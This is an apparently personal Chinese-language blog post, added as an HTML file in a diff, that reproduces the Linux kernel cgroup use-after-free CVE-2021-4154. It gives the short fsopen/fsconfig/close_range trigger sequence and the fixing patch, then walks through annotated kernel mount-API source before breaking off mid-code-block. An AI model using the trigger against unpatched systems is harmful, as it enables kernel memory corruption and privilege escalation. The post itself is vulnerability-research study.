@@ -1,0 +1,934 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/browser.jpg">
+  <link rel="icon" href="/img/browser.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="korey0sh1">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="脏脏的导管？怎么感觉这么不对呢🤔">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CVE-2021-4154 Remake">
+<meta property="og:url" content="http://example.com/2024/03/28/dirtycred/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="脏脏的导管？怎么感觉这么不对呢🤔">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240405192649.png">
+<meta property="article:published_time" content="2024-03-28T00:10:06.000Z">
+<meta property="article:modified_time" content="2024-04-06T05:36:34.953Z">
+<meta property="article:author" content="korey0sh1">
+<meta property="article:tag" content="OS">
+<meta property="article:tag" content="linux">
+<meta property="article:tag" content="kernel">
+<meta property="article:tag" content="CVE">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240405192649.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>CVE-2021-4154 Remake - Hexo</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.6","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', '');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>korey0sh1</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/57892762_p0_master1200.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="CVE-2021-4154 Remake"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        korey0sh1
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-03-28 08:10" pubdate>
+          2024年3月28日 早上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.2k 字
+        
+      </span>
+    
+
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">CVE-2021-4154 Remake</h1>
+            
+              <p class="note note-info">
+                
+                  
+                    本文最后更新于：2024年4月6日 下午
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="0x00：写在所有之前"><a href="#0x00：写在所有之前" class="headerlink" title="0x00：写在所有之前"></a>0x00：写在所有之前</h1><p>又是一个无地址泄露<strong>CVE</strong>的复现！</p>
+<p>本文所用的源码均为<code>linux 5.8.0</code></p>
+<h1 id="0x01：信息搜集"><a href="#0x01：信息搜集" class="headerlink" title="0x01：信息搜集"></a>0x01：信息搜集</h1><p><a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2021-4154">NVD - CVE-2021-4154 (nist.gov)</a></p>
+<p>影响版本非常广</p>
+<img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240328081341.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+
+<p>康一眼<a target="_blank" rel="noopener" href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=3b0462726e7ef281c35a7a4ae33e93ee2bc9975b">commit</a></p>
+<p>下面这个<code>poc</code>可以造成<strong>UAF</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//The following sequence can be used to trigger a UAF:</span><br><span class="hljs-type">int</span> fscontext_fd = fsopen(<span class="hljs-string">&quot;cgroup&quot;</span>);<br><span class="hljs-type">int</span> fd_null = open(<span class="hljs-string">&quot;/dev/null&quot;</span>, O_RDONLY);<br><span class="hljs-type">int</span> <span class="hljs-title function_">fsconfig</span><span class="hljs-params">(fscontext_fd, FSCONFIG_SET_FD, <span class="hljs-string">&quot;source&quot;</span>, fd_null)</span>;<br>close_range(<span class="hljs-number">3</span>, ~<span class="hljs-number">0U</span>, <span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure>
+
+<p>这个是<code>patch</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c">diff --git a/kernel/cgroup/cgroup-v1.c b/kernel/cgroup/cgroup-v1.c<br>index ee93b6e8958746.<span class="hljs-number">.527917</span>c0b30be4 <span class="hljs-number">100644</span><br>--- a/kernel/cgroup/cgroup-v1.c<br>+++ b/kernel/cgroup/cgroup-v1.c<br>@@ <span class="hljs-number">-912</span>,<span class="hljs-number">6</span> +<span class="hljs-number">912</span>,<span class="hljs-number">8</span> @@ <span class="hljs-type">int</span> <span class="hljs-title function_">cgroup1_parse_param</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> fs_context *fc, <span class="hljs-keyword">struct</span> fs_parameter *param)</span><br> 	opt = fs_parse(fc, cgroup1_fs_parameters, param, &amp;result);<br> 	<span class="hljs-keyword">if</span> (opt == -ENOPARAM) &#123;<br> 		<span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(param-&gt;key, <span class="hljs-string">&quot;source&quot;</span>) == <span class="hljs-number">0</span>) &#123;<br>+			<span class="hljs-keyword">if</span> (param-&gt;type != fs_value_is_string)<br>+				<span class="hljs-keyword">return</span> invalf(fc, <span class="hljs-string">&quot;Non-string source&quot;</span>);<br> 			<span class="hljs-keyword">if</span> (fc-&gt;source)<br> 				<span class="hljs-keyword">return</span> invalf(fc, <span class="hljs-string">&quot;Multiple sources not supported&quot;</span>);<br> 			fc-&gt;source = param-&gt;<span class="hljs-built_in">string</span>;<br></code></pre></td></tr></table></figure>
+
+<p>以上便是收集到的资料</p>
+<h1 id="0x02：前置知识"><a href="#0x02：前置知识" class="headerlink" title="0x02：前置知识"></a>0x02：前置知识</h1><h2 id="新一代mount系统调用"><a href="#新一代mount系统调用" class="headerlink" title="新一代mount系统调用"></a>新一代mount系统调用</h2><p>这大概是<strong>VFS</strong>的胜利🤔</p>
+<p>先来康一下老版本的<code>mount</code>是怎么用的</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mount.h&gt;</span>  </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span>  </span><br>  <br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span> &#123;  <br>        <span class="hljs-keyword">if</span> (mount(<span class="hljs-string">&quot;/dev/sdb1&quot;</span>, <span class="hljs-string">&quot;/mnt/tmp&quot;</span>, <span class="hljs-string">&quot;xfs&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>)) &#123;  <br>                perror(<span class="hljs-string">&quot;mount failed&quot;</span>);  <br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  <br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>简单粗暴，一个函数直接完事</p>
+<p>but新的<strong>mount API</strong>将过去封装的一个“臃肿”的<strong>mount</strong>拆分成了若干个系统调用（或者说若干个独立的阶段）</p>
+<p>首先是<strong>fsopen</strong></p>
+<h2 id="fsopen"><a href="#fsopen" class="headerlink" title="fsopen"></a>fsopen</h2><p>很粗暴的系统调用的封装</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">int</span> <span class="hljs-title function_">fsopen</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *fs_name, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>&#123;<br>	<span class="hljs-keyword">return</span> syscall(__NR_fsopen, fs_name, flags);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>**fsopen()<strong>，功能与</strong>open()<strong>系统调用非常相似。当</strong>open()<strong>用于打开一个文件并获取与之相关的文件描述符fd时，</strong>fsopen()**则旨在打开一个文件系统，并获取该文件系统的上下文。随后，它会将这个文件系统上下文与一个文件描述符绑定，并返回该文件描述符。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Open a filesystem by name so that it can be configured for mounting.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * We are allowed to specify a container in which the filesystem will be</span><br><span class="hljs-comment"> * opened, thereby indicating which namespaces will be used (notably, which</span><br><span class="hljs-comment"> * network namespace will be used for network filesystems).</span><br><span class="hljs-comment"> */</span><br>SYSCALL_DEFINE2(fsopen, <span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *, _fs_name, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>, flags)<br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_system_type</span> *<span class="hljs-title">fs_type</span>;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs_context</span> *<span class="hljs-title">fc</span>;</span><br>	<span class="hljs-type">const</span> <span class="hljs-type">char</span> *fs_name;<br>	<span class="hljs-type">int</span> ret;<br>	<span class="hljs-comment">//使用ns_capable函数检查当前进程的命名空间是否具有CAP_SYS_ADMIN权限</span><br>	<span class="hljs-keyword">if</span> (!ns_capable(current-&gt;nsproxy-&gt;mnt_ns-&gt;user_ns, CAP_SYS_ADMIN))<br>		<span class="hljs-keyword">return</span> -EPERM;<br>	<span class="hljs-comment">//检查传入的flags参数是否包含除了FSOPEN_CLOEXEC之外的其他位</span><br>	<span class="hljs-keyword">if</span> (flags &amp; ~FSOPEN_CLOEXEC)<br>		<span class="hljs-keyword">return</span> -EINVAL;<br>	<span class="hljs-comment">//使用strndup_user函数从用户空间复制文件系统的名称，这个名称的长度限制为PAGE_SIZE</span><br>	fs_name = strndup_user(_fs_name, PAGE_SIZE);<br>	<span class="hljs-keyword">if</span> (IS_ERR(fs_name))<br>		<span class="hljs-keyword">return</span> PTR_ERR(fs_name);<br>	<span class="hljs-comment">//根据文件系统名称获取file_system_type结构</span><br>	fs_type = get_fs_type(fs_name);<br>	kfree(fs_name);<br>	<span class="hljs-keyword">if</span> (!fs_type)<br>		<span class="hljs-keyword">return</span> -ENODEV;<br>	<span class="hljs-comment">//创建一个上下文fc</span><br>	fc = fs_context_for_mount(fs_type, <span class="hljs-number">0</span>);<br>	put_filesystem(fs_type);<span class="hljs-comment">//减少文件系统类型的引用计数。</span><br>	<span class="hljs-keyword">if</span> (IS_ERR(fc))<br>		<span class="hljs-keyword">return</span> PTR_ERR(fc);<br>	<span class="hljs-comment">//表示正在创建挂载参数</span><br>	fc-&gt;phase = FS_CONTEXT_CREATE_PARAMS;<br>	<span class="hljs-comment">//分配一个日志上下文</span><br>	ret = fscontext_alloc_log(fc);<br>	<span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>)<br>		<span class="hljs-keyword">goto</span> err_fc;<br>	<span class="hljs-comment">//创建一个文件描述符，如果flags包含FSOPEN_CLOEXEC，则使用O_CLOEXEC标志</span><br>	<span class="hljs-keyword">return</span> fscontext_create_fd(fc, flags &amp; FSOPEN_CLOEXEC ? O_CLOEXEC : <span class="hljs-number">0</span>);<br><br>err_fc:<br>	put_fs_context(fc);<br>	<span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>其中<strong>fs_context</strong>是随着这一批新的系统调用一起引入的</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs_context</span> &#123;</span><br>    	<span class="hljs-comment">//文件系统上下文实例持续期间，提供给文件系统上下文使用的众多方法。一般由特定文件系统类型的init_fs_context方法来对其进行设置。</span><br>        <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs_context_operations</span> *<span class="hljs-title">ops</span>;</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mutex</span>            <span class="hljs-title">uapi_mutex</span>;</span>     <span class="hljs-comment">/* Userspace access mutex */</span><br>    	<span class="hljs-comment">//用来指向即将被挂载（或重新配置）的文件系统所属文件系统类型实例的指针</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_system_type</span> *<span class="hljs-title">fs_type</span>;</span><br>    	<span class="hljs-comment">//指向文件系统私有数据的指针，常用于存储需要特定文件系统来解析的选项</span><br>        <span class="hljs-type">void</span>                    *fs_private;    <span class="hljs-comment">/* The filesystem&#x27;s context */</span><br>        <span class="hljs-type">void</span>                    *sget_key;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dentry</span>           *<span class="hljs-title">root</span>;</span>          <span class="hljs-comment">/* The root and superblock */</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_namespace</span>   *<span class="hljs-title">user_ns</span>;</span>       <span class="hljs-comment">/* The user namespace for this mount */</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">net</span>              *<span class="hljs-title">net_ns</span>;</span>        <span class="hljs-comment">/* The network namespace for this mount */</span><br>        <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span>       *<span class="hljs-title">cred</span>;</span>          <span class="hljs-comment">/* The mounter&#x27;s credentials */</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fc_log</span>           *<span class="hljs-title">log</span>;</span>           <span class="hljs-comment">/* Logging buffer */</span><br>        <span class="hljs-type">const</span> <span class="hljs-type">char</span>              *source;        <span class="hljs-comment">/* The source name (eg. dev path) */</span><br>        <span class="hljs-type">void</span>                    *security;      <span class="hljs-comment">/* Linux S&amp;M options */</span><br>        <span class="hljs-type">void</span>                    *s_fs_info;     <span class="hljs-comment">/* Proposed s_fs_info */</span><br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>            sb_flags;       <span class="hljs-comment">/* Proposed superblock flags (SB_*) */</span><br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>            sb_flags_mask;  <span class="hljs-comment">/* Superblock flags that were changed */</span><br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>            s_iflags;       <span class="hljs-comment">/* OR&#x27;d with sb-&gt;s_iflags */</span><br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>            lsm_flags;      <span class="hljs-comment">/* Information flags from the fs to the LSM */</span><br>        <span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">fs_context_purpose</span> <span class="hljs-title">purpose</span>:</span><span class="hljs-number">8</span>;<br>        <span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">fs_context_phase</span>   <span class="hljs-title">phase</span>:</span><span class="hljs-number">8</span>;        <span class="hljs-comment">/* The phase the context is in */</span><br>        <span class="hljs-type">bool</span>                    need_free:<span class="hljs-number">1</span>;    <span class="hljs-comment">/* Need to call ops-&gt;free() */</span><br>        <span class="hljs-type">bool</span>                    global:<span class="hljs-number">1</span>;       <span class="hljs-comment">/* Goes into &amp;init_user_ns */</span><br>&#125;;<br></code></pre></td></tr></table></figure>
+
+<p>PS：注意这里打开的不是一个具体的<code>on-disk</code>文件系统（如&#x2F;dev&#x2F;sdb1上的文件系统)，而是一个文件系统“类型”</p>
+<p>获取了针对文件系统的文件描述符后，接下来步骤是使用**fsconfig()**来对这个文件系统上下文进行配置</p>
+<h2 id="fsconfig"><a href="#fsconfig" class="headerlink" title="fsconfig"></a>fsconfig</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">int</span> <span class="hljs-title function_">fsconfig</span><span class="hljs-params">(<span class="hljs-type">int</span> fsfd, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd,</span><br><span class="hljs-params">			   <span class="hljs-type">const</span> <span class="hljs-type">char</span> *key, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *val, <span class="hljs-type">int</span> aux)</span><br>&#123;<br>	<span class="hljs-keyword">return</span> syscall(__NR_fsconfig, fsfd, cmd, key, val, aux);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>详细一点的</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span 